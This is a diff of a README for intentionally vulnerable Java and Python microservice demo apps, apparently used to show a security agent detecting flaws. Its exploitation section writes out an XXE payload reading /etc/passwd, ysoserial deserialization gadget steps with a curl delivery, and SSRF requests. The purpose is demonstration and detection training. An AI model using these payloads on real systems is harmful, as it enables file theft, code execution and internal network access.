@@ -1,7 +1,7 @@
 # java-sample-apps
 This repo holds a few Java apps showing the agent's ability to discover the most common vulnerabilities in microservices.
 
-There are 3 microservice apps that implement a "book store".
+There are 6 microservice apps that implement a "book store".
 
 ## The Microservices
 
@@ -58,7 +58,16 @@ THe bookstore-reviews app is a Python Fask app that offers user reviews of the b
 
 ## Usage
 
-The first step is to start the services.
+The first step is to edit `env-contrast-user` with your user credentials from
+Team Server.  Note that these are not the same as your agent credentials which
+are used when running the apps.  More details are in the files to edit.  Then
+build the services (uses Bash syntax).  docker-compose will normally build the
+images as needed, but in this case you need to provide environment variables
+for the agent-grabber container, which downloads the latest agents from your
+Team Server account.
+```
+$ env $(grep -v \# env-contrast-user|xargs) docker-compose -f docker-compose.yml -f docker-compose-contrast.yml build
+```
 
 To start normally:
 ```
@@ -70,16 +79,21 @@ To start with Contrast enabled, first edit `contrast_security.yaml` with your ag
 $ docker-compose -f docker-compose.yml -f docker-compose-contrast.yml up
 ```
 
-The latest Contrast agent will be pulled down via the agent-grabber container, when it is built.  If you want to grab a new version of the agent, you may need to:
+The latest Contrast agent will be pulled down via the agent-grabber container,
+when it is built.  If you want to grab a new version of the agent, you may
+need to (note that the second command uses Bash syntax):
 ```
-$ docker-compose down && docker-compose build
+$ docker-compose down
+$ env $(grep -v \# env-contrast-user|xargs) docker-compose -f docker-compose.yml -f docker-compose-contrast.yml build
 ```
 
-If you don't want to use docker-compose, each service has a Dockerfile to make running 1 step. Consult each service's `README.md` to see the commands.
+If you don't want to use docker-compose, each service has a Dockerfile you can
+run manually. Consult each service's `README.md` to see the commands.
 
 ### Using the services
 
-You're _supposed_ to do everything through the frontend service.
+You're _supposed_ to do everything through the frontend service.  The script
+`exercise-apps.sh` performs the steps described below.
 
 Get a health check on the entire bookstore service mesh:
 ```
@@ -138,31 +152,36 @@ $ curl -X POST -H "Content-Type: application/xml" http://localhost:8000/reviews/
 ```
 
 ## Detecting the vulnerabilities
-To detect the vulnerabilities, start the apps with Contrast enabled as described above.  Then use the services to exercise the code.  It isn't necessary to exploit the vulnerabilities in order for Contrast to identify the vulnerabilities.
+To detect the vulnerabilities, start the apps with Contrast enabled as
+described above.  Then use the services or `exercise-apps.sh` to exercise the
+code.  Note that it isn't necessary to exploit the vulnerabilities in order
+for Contrast to identify the vulnerabilities.
 
 ## Exploiting the Vulnerabilities
 
 ### XML External Entity (XXE)
-The XXE vulnerability can be exploited directly in the bookstore-frontend by adding a new malicious
-book:
+The XXE vulnerability can be exploited directly in the bookstore-frontend by
+adding a new malicious book:
 ```
 $ curl -H "Content-Type: application/xml" http://localhost:8000/add -d '<?xml version="1.0"?><!DOCTYPE book [<!ENTITY xxe SYSTEM "/etc/passwd">]><book><title>foo &xxe;</title><pages>21</pages></book>'
 ```
 
-Now the contents of `/etc/passwd` has leaked into the the new book title, which you can see by
-checking the book titles:
+Now the contents of `/etc/passwd` has leaked into the the new book title, which
+you can see by checking the book titles:
 ```
 $ curl http://localhost:8000/list
 ```
 
 ### Deserialization
-The `bookstore-data-manager` offers an "update a book" service that is not supposed to be used from
-the outside, which is why it's not available through the `bookstore-frontend`.
+The `bookstore-data-manager` offers an "update a book" service that is not
+supposed to be used from the outside, which is why it's not available through
+the `bookstore-frontend`.
 
-This service is available at `/update`, and it accepts a binary, serialized Java object with `Book`
-type.
+This service is available at `/update`, and it accepts a binary, serialized
+Java object with `Book` type.
 
-To exploit this, we must first make an exploit that creates a file in `/tmp` as a proof-of-concept:
+To exploit this, we must first make an exploit that creates a file in `/tmp` as
+a proof-of-concept:
 ```
 $ git clone https://github.com/frohoff/ysoserial
 $ cd ysoserial
@@ -175,9 +194,11 @@ Now you can send the exploit generated in the `commonscollections5.ser` file:
 $ curl -X POST -H "Content-Type: application/octet-stream" --data-binary "@commonscollections5.ser" http://localhost:8001/update
 ```
 
-To prove that we created this `/tmp/hacked` file, we must shell into the running container. 
+To prove that we created this `/tmp/hacked` file, we must shell into the
+running container. 
 
-If you started with docker-compose, the container ID is something like java-microservice-sample-apps_bookstore-datamanager_1.
+If you started with docker-compose, the container ID is something like
+java-microservice-sample-apps_bookstore-datamanager_1.
 
 If you ran the containers manually, you can start with the ID:
 ```
@@ -194,12 +215,17 @@ $ docker exec -it java-microservice-sample-apps_bookstore-datamanager_1 ls -al /
 ```
 
 ### Server Side Request Forgery (SSRF)
-The `bookstore-frontend` exposes a "info" service, only intended for developers. It is intended to be used to retrieve data about different developer environments, but it can be used to force the app to retrieve data from other URLs:
+The bookstore-frontend exposes an info service, only intended for developers.
+It is intended to be used to retrieve data about different developer
+environments, but it can be used to force the app to retrieve data from other
+URLs:
 ```
 $ curl http://localhost:8002/application/info?env=google.com/?
 ```
 
-Obviously in this case we ask the server to retrieve Google content, but it could as easily be pointed towards URLs typically only accessed within your perimeter.
+Obviously in this case we ask the server to retrieve Google content, but it
+could just as easily be pointed towards URLs typically only accessed within
+your perimeter.
 
 ```
 $ curl http://localhost:8002/application/info?env=SECRET
